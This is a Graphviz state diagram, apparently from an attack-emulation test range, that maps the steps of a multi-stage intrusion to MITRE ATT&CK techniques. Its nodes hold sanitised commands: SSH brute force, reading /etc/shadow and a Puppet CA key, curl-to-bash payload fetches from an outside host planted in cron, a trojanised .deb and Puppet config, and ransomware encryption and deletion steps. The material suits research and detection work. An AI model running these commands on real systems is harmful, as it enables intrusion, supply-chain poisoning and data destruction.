@@ -1,0 +1,341 @@
+// Commands State Diagram
+digraph {
+	rankdir=TB
+	1 [label="1: hydra__C_user_pass_combo_txt__s_10022_fw_attackbed_com_ssh
+T1078.002: Valid Accounts: Domain Accounts
+T1110.001: Brute Force: Password Guessing
+T1133: External Remote Services
+{'initial-access', 'credential-access', 'persistence', 'privilege-escalation', 'defense-evasion'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	2 [label="2: id
+T1078.002: Valid Accounts: Domain Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+ssh_apt, ssh_healthcheck" shape=box style=rounded]
+	3 [label="3: tcpdump__A_port_21_
+T1040: Network Sniffing
+{'credential-access', 'discovery'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	4 [label="4: _i_
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	5 [label="5: rambo_
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	6 [label="6: cat__etc_shadow_
+T1003.008: OS Credential Dumping: /etc/passwd and /etc/shadow
+{'credential-access'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	7 [label="7: cat__etc_puppetlabs_puppetserver_ca_ca_key_pem_
+T1213: Data from Information Repositories
+{'collection'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	8 [label="8: cat__media_share_healthcheck_cron_sh_
+T1039: Data from Network Shared Drive
+{'collection'}
+ssh_apt, ssh_healthcheck, ssh_puppet" shape=box style=rounded]
+	9 [label="9: ls__l__var_www_html_debian_
+T1083: File and Directory Discovery
+{'discovery'}
+ssh_apt" shape=box style=rounded]
+	10 [label="10: apt_update____apt_install__y_dpkg_dev_
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'execution'}
+ssh_apt" shape=box style=rounded]
+	11 [label="11: mkdir__tmp__tmux_data_
+T1036.005: Masquerading: Match Legitimate Resource Name or Location
+T1564.001: Hide Artifacts: Hidden Files and Directories
+{'defense-evasion'}
+ssh_apt" shape=box style=rounded]
+	12 [label="12: dpkg_deb__R__var_www_html_debian_healthcheckd_1_0_1_amd64_deb_healthcheckd_
+T1574: Hijack Execution Flow
+{'persistence', 'privilege-escalation', 'defense-evasion'}
+ssh_apt" shape=box style=rounded]
+	13 [label="13: __s_1_0_1_1_0_2_g_
+T1059: Command and Scripting Interpreter
+T1574: Hijack Execution Flow
+{'persistence', 'defense-evasion', 'privilege-escalation', 'execution'}
+ssh_apt" shape=box style=rounded]
+	14 [label="14: _wq_
+T1059: Command and Scripting Interpreter
+T1574: Hijack Execution Flow
+{'persistence', 'defense-evasion', 'privilege-escalation', 'execution'}
+ssh_apt" shape=box style=rounded]
+	15 [label="15: echo____5_________root_curl_http___192_42_1_174_8888_install_sh___bash_____etc_cron_d_health
+T1053.003: Scheduled Task/Job: Cron
+T1105: Ingress Tool Transfer
+T1071.001: Application Layer Protocol: Web Protocols
+{'command-and-control', 'persistence', 'privilege-escalation', 'execution'}
+ssh_apt" shape=box style=rounded]
+	16 [label="16: _wq_
+T1053.003: Scheduled Task/Job: Cron
+T1105: Ingress Tool Transfer
+T1071.001: Application Layer Protocol: Web Protocols
+{'command-and-control', 'persistence', 'privilege-escalation', 'execution'}
+ssh_apt" shape=box style=rounded]
+	17 [label="17: dpkg_deb__b_healthcheckd__var_www_html_debian_healthcheckd_1_0_2_amd64_deb_
+T1072: Software Deployment Tools
+{'lateral-movement', 'execution'}
+ssh_apt" shape=box style=rounded]
+	18 [label="18: dpkg_scanpackages_____gzip__c9____Packages_gz_
+T1072: Software Deployment Tools
+{'lateral-movement', 'execution'}
+ssh_apt" shape=box style=rounded]
+	19 [label="19: shell
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	20 [label="20: python3__c__import_pty_pty_spawn___bash_____
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	21 [label="21: export_SHELL_bash
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	22 [label="22: export_TERM_xterm256_color
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	23 [label="23: stty_rows_38_columns_116
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	24 [label="24: export_PS1__PWN__
+T1059: Command and Scripting Interpreter
+{'execution'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	25 [label="25: curl_http___192_42_1_174_donotcry___donotcry
+T1486: Data Encrypted for Impact
+T1105: Ingress Tool Transfer
+{'impact', 'command-and-control'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	26 [label="26: _lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images
+T1486: Data Encrypted for Impact
+T1565.001: Data Manipulation: Stored Data Manipulation
+{'impact'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	27 [label="27: find__media_data_Images
+T1018: Remote System Discovery
+{'discovery'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	28 [label="28: cat__etc_passwd
+T1087.001: Account Discovery: Local Account
+{'discovery'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	29 [label="29: userdel__f_john
+T1531: Account Access Removal
+{'impact'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	30 [label="30: rm
+T1485: Data Destruction
+{'impact'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	31 [label="31: rm
+T1490: Inhibit System Recovery
+{'impact'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	32 [label="32: systemctl_stop_exim4_service
+T1489: Service Stop
+{'impact'}
+ssh_apt, ssh_healthcheck, ssh_puppet, vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	33 [label="33: curl_http___192_42_1_174_8888_install_sh___bash_
+T1080: Taint Shared Content
+{'lateral-movement'}
+ssh_healthcheck" shape=box style=rounded]
+	34 [label="34: _wq_
+T1080: Taint Shared Content
+{'lateral-movement'}
+ssh_healthcheck" shape=box style=rounded]
+	35 [label="35: sysinfo
+T1082: System Information Discovery
+{'discovery'}
+ssh_healthcheck, vnc_healthcheck" shape=box style=rounded]
+	36 [label="36: getuid
+T1033: System Owner/User Discovery
+{'discovery'}
+ssh_healthcheck, vnc_healthcheck" shape=box style=rounded]
+	37 [label="37: id
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+ssh_puppet" shape=box style=rounded]
+	38 [label="38: class_blah2___exec____curl_http___192_42_1_174_8888_install_sh___bash______path_______usr_bin____bin________
+T1072: Software Deployment Tools
+T1105: Ingress Tool Transfer
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'command-and-control', 'lateral-movement', 'execution'}
+ssh_puppet" shape=box style=rounded]
+	39 [label="39: node__linuxshare_attackbed_local______class____blah2_______
+T1072: Software Deployment Tools
+T1105: Ingress Tool Transfer
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'command-and-control', 'lateral-movement', 'execution'}
+ssh_puppet" shape=box style=rounded]
+	40 [label="40: _wq_
+T1072: Software Deployment Tools
+T1105: Ingress Tool Transfer
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'command-and-control', 'lateral-movement', 'execution'}
+ssh_puppet" shape=box style=rounded]
+	41 [label="41: items_LISTA_
+T1110.001: Brute Force: Password Guessing
+T1021.005: Remote Services: VNC
+{'credential-access', 'lateral-movement'}
+vnc_apt" shape=box style=rounded]
+	42 [label="42: click
+T1021.005: Remote Services: VNC
+{'lateral-movement'}
+vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	43 [label="43: terminal
+T1021.005: Remote Services: VNC
+{'lateral-movement'}
+vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	44 [label="44: sudo__i
+T1021.005: Remote Services: VNC
+{'lateral-movement'}
+vnc_apt, vnc_healthcheck" shape=box style=rounded]
+	45 [label="45: key
+T1003.008: OS Credential Dumping: /etc/passwd and /etc/shadow
+{'credential-access'}
+vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	46 [label="46: key
+T1213: Data from Information Repositories
+{'collection'}
+vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	47 [label="47: key
+T1039: Data from Network Shared Drive
+{'collection'}
+vnc_apt, vnc_healthcheck, vnc_puppet" shape=box style=rounded]
+	48 [label="48: key
+T1083: File and Directory Discovery
+{'discovery'}
+vnc_apt" shape=box style=rounded]
+	49 [label="49: key
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'execution'}
+vnc_apt" shape=box style=rounded]
+	50 [label="50: key
+T1036.005: Masquerading: Match Legitimate Resource Name or Location
+T1564.001: Hide Artifacts: Hidden Files and Directories
+{'defense-evasion'}
+vnc_apt" shape=box style=rounded]
+	51 [label="51: key
+T1574: Hijack Execution Flow
+{'persistence', 'privilege-escalation', 'defense-evasion'}
+vnc_apt" shape=box style=rounded]
+	52 [label="52: sed__i__s_1__0_1_1__0_2_g__DEBIAN_control_
+T1059: Command and Scripting Interpreter
+T1574: Hijack Execution Flow
+{'persistence', 'defense-evasion', 'privilege-escalation', 'execution'}
+vnc_apt" shape=box style=rounded]
+	53 [label="53: sed__i___invoke_rc_a_echo____5_________root__usr_bin_curl_http___192_42_1_174_8888_install_sh____bin_bash_____etc_cron_d_health__DEBIAN_postinst_
+T1053.003: Scheduled Task/Job: Cron
+T1105: Ingress Tool Transfer
+T1071.001: Application Layer Protocol: Web Protocols
+{'command-and-control', 'persistence', 'privilege-escalation', 'execution'}
+vnc_apt" shape=box style=rounded]
+	54 [label="54: key
+T1072: Software Deployment Tools
+{'lateral-movement', 'execution'}
+vnc_apt" shape=box style=rounded]
+	55 [label="55: items_LISTA_
+T1110.001: Brute Force: Password Guessing
+T1021.005: Remote Services: VNC
+{'credential-access', 'lateral-movement'}
+vnc_healthcheck" shape=box style=rounded]
+	56 [label="56: echo__curl_http___192_42_1_174_8888_install_sh___bash______media_share_healthcheck_cron_sh
+T1105: Ingress Tool Transfer
+T1059.004: Command and Scripting Interpreter: Unix Shell
+T1053.003: Scheduled Task/Job: Cron
+T1021.005: Remote Services: VNC
+T1071.001: Application Layer Protocol: Web Protocols
+{'persistence', 'privilege-escalation', 'execution', 'command-and-control', 'lateral-movement'}
+vnc_healthcheck" shape=box style=rounded]
+	57 [label="57: close
+T1021.005: Remote Services: VNC
+{'lateral-movement'}
+vnc_healthcheck" shape=box style=rounded]
+	58 [label="58: items_LISTA_
+T1110.001: Brute Force: Password Guessing
+T1021.005: Remote Services: VNC
+{'credential-access', 'lateral-movement'}
+vnc_puppet" shape=box style=rounded]
+	59 [label="59: sudo__i
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+vnc_puppet" shape=box style=rounded]
+	60 [label="60: key
+T1072: Software Deployment Tools
+T1105: Ingress Tool Transfer
+T1059.004: Command and Scripting Interpreter: Unix Shell
+{'command-and-control', 'lateral-movement', 'execution'}
+vnc_puppet" shape=box style=rounded]
+	1 -> 37
+	11 -> 12
+	40 -> 19
+	48 -> 49
+	5 -> 6
+	55 -> 42
+	1 -> 2
+	38 -> 39
+	42 -> 43
+	33 -> 34
+	43 -> 59
+	21 -> 22
+	8 -> 38
+	26 -> 27
+	20 -> 21
+	47 -> 56
+	56 -> 57
+	50 -> 51
+	51 -> 52
+	41 -> 42
+	57 -> 35
+	45 -> 46
+	47 -> 60
+	47 -> 48
+	37 -> 3
+	31 -> 32
+	2 -> 3
+	13 -> 14
+	9 -> 10
+	8 -> 9
+	36 -> 19
+	54 -> 19
+	58 -> 42
+	39 -> 40
+	17 -> 18
+	10 -> 11
+	3 -> 4
+	49 -> 50
+	52 -> 53
+	27 -> 28
+	12 -> 13
+	25 -> 26
+	59 -> 45
+	7 -> 8
+	59 -> 59
+	29 -> 30
+	4 -> 5
+	46 -> 47
+	53 -> 54
+	34 -> 35
+	16 -> 17
+	30 -> 31
+	23 -> 24
+	24 -> 25
+	22 -> 23
+	19 -> 20
+	6 -> 7
+	28 -> 29
+	44 -> 45
+	43 -> 44
+	60 -> 19
+	15 -> 16
+	14 -> 15
+	8 -> 33
+	18 -> 19
+	54 -> 54
+	35 -> 36
+}
